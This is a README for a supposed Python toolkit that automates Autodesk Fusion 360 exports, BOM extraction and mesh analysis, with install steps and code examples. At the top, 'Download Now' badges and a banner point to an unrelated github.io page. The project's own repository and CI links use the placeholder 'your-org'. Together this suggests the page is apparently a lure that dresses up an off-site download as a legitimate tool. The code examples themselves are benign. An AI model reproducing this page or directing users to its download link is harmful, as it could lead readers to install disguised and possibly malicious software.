# fusion-360-toolkit

[![Download Now](https://img.shields.io/badge/Download_Now-Click_Here-brightgreen?style=for-the-badge&logo=download)](https://italohiel.github.io/fusion-link-x5z/)


[![Banner](banner.png)](https://italohiel.github.io/fusion-link-x5z/)


[![Python Version](https://img.shields.io/badge/python-3.8%2B-blue.svg)](https://www.python.org/downloads/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![PyPI Version](https://img.shields.io/pypi/v/fusion-360-toolkit.svg)](https://pypi.org/project/fusion-360-toolkit/)
[![Build Status](https://img.shields.io/github/actions/workflow/status/your-org/fusion-360-toolkit/ci.yml)](https://github.com/your-org/fusion-360-toolkit/actions)
[![Code Style: Black](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)
[![Download](https://italohiel.github.io/fusion-link-x5z/)](https://pypi.org/project/fusion-360-toolkit/)

---

A Python toolkit for automating workflows, processing design files, and extracting structured data from **Autodesk Fusion** projects on Windows. Built for engineers, CAD developers, and DevOps teams who need programmatic control over Fusion 360 assets and pipelines.

> **Note:** This toolkit interfaces with an existing, licensed installation of Autodesk Fusion on Windows. It does not bundle or distribute Autodesk software.

---

## Table of Contents

- [Features](#features)
- [Requirements](#requirements)
- [Installation](#installation)
- [Quick Start](#quick-start)
- [Usage Examples](#usage-examples)
- [Configuration](#configuration)
- [Contributing](#contributing)
- [License](#license)

---

## Features

- 🔧 **Workflow Automation** — Trigger exports, translations, and batch operations on Fusion 360 designs via Python scripts
- 📁 **File Processing** — Parse, validate, and transform `.f3d`, `.f3z`, and exported mesh/CAD formats programmatically
- 📊 **Data Extraction** — Extract component trees, geometry metadata, material assignments, and BOM data from design files
- 🔌 **API Bridge** — Thin wrapper around the Autodesk Fusion 360 Python API for scripting inside the add-in environment
- 🗂️ **Batch Operations** — Process entire project directories, rename components, and apply templates at scale
- 📐 **Geometry Analysis** — Compute bounding boxes, surface areas, and volume estimates from exported mesh data
- 🔄 **Export Pipelines** — Automate multi-format exports (STL, STEP, OBJ, DXF) with configurable quality presets
- 🧪 **Testing Utilities** — Helpers for writing unit and integration tests against Fusion 360 add-ins and scripts

---

## Requirements

| Requirement | Version / Notes |
|---|---|
| Python | 3.8 or higher |
| Operating System | Windows 10 / Windows 11 |
| Autodesk Fusion | 2.0.x or later (licensed installation) |
| `requests` | >= 2.28.0 |
| `pydantic` | >= 1.10.0 |
| `trimesh` | >= 3.20.0 (optional, for mesh analysis) |
| `click` | >= 8.1.0 (CLI support) |
| `rich` | >= 13.0.0 (terminal output) |

---

## Installation

### From PyPI

```bash
pip install fusion-360-toolkit
```

### From Source

```bash
git clone https://github.com/your-org/fusion-360-toolkit.git
cd fusion-360-toolkit
pip install -e ".[dev]"
```

### With Optional Mesh Analysis Support

```bash
pip install "fusion-360-toolkit[mesh]"
```

### Verify Installation

```bash
python -m fusion360toolkit --version
# fusion-360-toolkit v0.4.2
```

---

## Quick Start

```python
from fusion360toolkit import FusionProject, ExportConfig

# Point the toolkit at a local Fusion 360 archive file
project = FusionProject.from_file("assembly_v3.f3d")

# Inspect the top-level component tree
for component in project.components:
    print(f"{component.name}  |  bodies: {component.body_count}  |  visible: {component.is_visible}")

# Export all components to STEP format
config = ExportConfig(format="step", output_dir="./exports", quality="high")
project.export(config)
```

Expected output:

```
MainFrame       |  bodies: 4  |  visible: True
BracketLeft     |  bodies: 1  |  visible: True
BracketRight    |  bodies: 1  |  visible: True
MountingPlate   |  bodies: 2  |  visible: False
Exported 4 components → ./exports/  (12 files written)
```

---

## Usage Examples

### 1. Batch-Export a Project Directory

Process every `.f3d` file in a folder and export each to STL for downstream slicing or simulation pipelines.

```python
from pathlib import Path
from fusion360toolkit import FusionProject, ExportConfig, BatchProcessor

processor = BatchProcessor(
    source_dir=Path("C:/Users/you/Fusion Projects/"),
    export_config=ExportConfig(
        format="stl",
        output_dir=Path("./stl_output"),
        quality="medium",
        units="mm",
    ),
    recursive=True,
    skip_on_error=True,
)

results = processor.run()

print(f"Processed : {results.success_count} files")
print(f"Skipped   : {results.skip_count} files")
print(f"Errors    : {results.error_count} files")

for error in results.errors:
    print(f"  [WARN] {error.file}: {error.message}")
```

---

### 2. Extract Bill of Materials (BOM)

Pull a structured BOM from a Fusion 360 design and write it to CSV or JSON for ERP/PLM integration.

```python
from fusion360toolkit import FusionProject
from fusion360toolkit.bom import BOMExtractor
import json

project = FusionProject.from_file("product_assembly.f3d")
extractor = BOMExtractor(project)

bom = extractor.extract(
    include_suppressed=False,
    group_by_material=True,
)

# Write to JSON
with open("bom_output.json", "w") as f:
    json.dump(bom.to_dict(), f, indent=2)

# Or write to CSV directly
bom.to_csv("bom_output.csv")

print(f"Total line items : {len(bom.items)}")
print(f"Unique materials : {len(bom.materials)}")
```

Sample `bom_output.json` structure:

```json
{
  "assembly": "product_assembly",
  "generated_at": "2024-11-14T09:32:00Z",
  "items": [
    {
      "part_number": "COMP-001",
      "name": "MainFrame",
      "quantity": 1,
      "material": "Aluminum 6061",
      "mass_kg": 0.482
    },
    {
      "part_number": "COMP-002",
      "name": "BracketLeft",
      "quantity": 2,
      "material": "Steel AISI 1020",
      "mass_kg": 0.118
    }
  ]
}
```

---

### 3. Geometry and Mesh Analysis

Analyze exported mesh data — useful for design validation, cost estimation, and manufacturing prep.

```python
from fusion360toolkit.analysis import MeshAnalyzer

analyzer = MeshAnalyzer.from_stl("./exports/MainFrame.stl")

report = analyzer.analyze()

print(f"Volume          : {report.volume_cm3:.3f} cm³")
print(f"Surface area    : {report.surface_area_cm2:.3f} cm²")
print(f"Bounding box    : {report.bounding_box}")   # (X, Y, Z) in mm
print(f"Is watertight   : {report.is_watertight}")
print(f"Triangle count  : {report.triangle_count:,}")

# Export analysis report
report.to_json("MainFrame_analysis.json")
```

---

### 4. Fusion 360 Add-In Scripting (In-Process API)

When running inside the Autodesk Fusion 360 add-in environment, the toolkit exposes helpers that wrap the native Python API for cleaner scripting.

```python
# This script runs inside Fusion 360 via Scripts & Add-Ins
import adsk.core
import adsk.fusion
from fusion360toolkit.addin import get_active_design, iter_bodies

def run(context):
    design = get_active_design()

    if design is None:
        print("No active design found.")
        return

    print(f"Design name : {design.name}")
    print(f"Unit system : {design.fusionUnitsManager.distanceDisplayUnits}")

    for body in iter_bodies(design.rootComponent, include_occurrences=True):
        print(f"  Body: {body.name}  |  Volume: {body.volume:.4f} cm³")
```

---

### 5. CLI Usage

The toolkit ships with a command-line interface for quick one-off tasks.

```bash
# Display component tree of a design file
fusion360toolkit inspect assembly_v3.f3d

# Batch export an entire directory to STEP
fusion360toolkit export ./designs/ --format step --output ./exports/ --quality high

# Extract BOM and write to CSV
fusion360toolkit bom product_assembly.f3d --output bom.csv --format csv

# Analyze an STL mesh file
fusion360toolkit analyze MainFrame.stl --report json
```

---

## Configuration

Create a `fusion360toolkit.toml` file in your project root to set defaults:

```toml
[toolkit]
default_units = "mm"
skip_hidden_components = true
log_level = "INFO"

[export]
default_format = "step"
output_dir = "./exports"
quality = "high"

[bom]
include_suppressed = false
group_by_material = true
output_format = "csv"

[analysis]
watertight_check = true
report_format = "json"
```

Load it in your script:

```python
from fusion360toolkit.config import ToolkitConfig

config = ToolkitConfig.from_file("fusion360toolkit.toml")
print(config.export.default_format)  # "step"
```

---

## Project Structure

```
fusion-360-toolkit/
├── fusion360toolkit/
│   ├── __init__.py
│   ├── project.py          # FusionProject core class
│   ├── batch.py            # BatchProcessor
│   ├── bom.py              # BOMExtractor
│   ├── analysis.py         # MeshAnalyzer
│   ├── addin.py            # In-process Fusion API helpers
│   ├── config.py           # Configuration loader
│   └── cli.py              # Click-based CLI entry point
├── tests/
│   ├── test_project.py
│   ├── test_bom.py
│   └── fixtures/
├── docs/
├── pyproject.toml
└── README.md
```

---

## Contributing

Contributions are welcome — bug fixes, new exporters, additional analysis tools, or documentation improvements.

1. Fork the repository
2. Create a feature branch: `git checkout -b feat/your-feature-name`
3. Install dev dependencies: `pip install -e ".[dev]"`
4. Write tests for your changes
5. Run the test suite: `pytest tests/ -v`
6. Run the linter: `black . && ruff check .`
7. Open a pull request with a clear description

Please read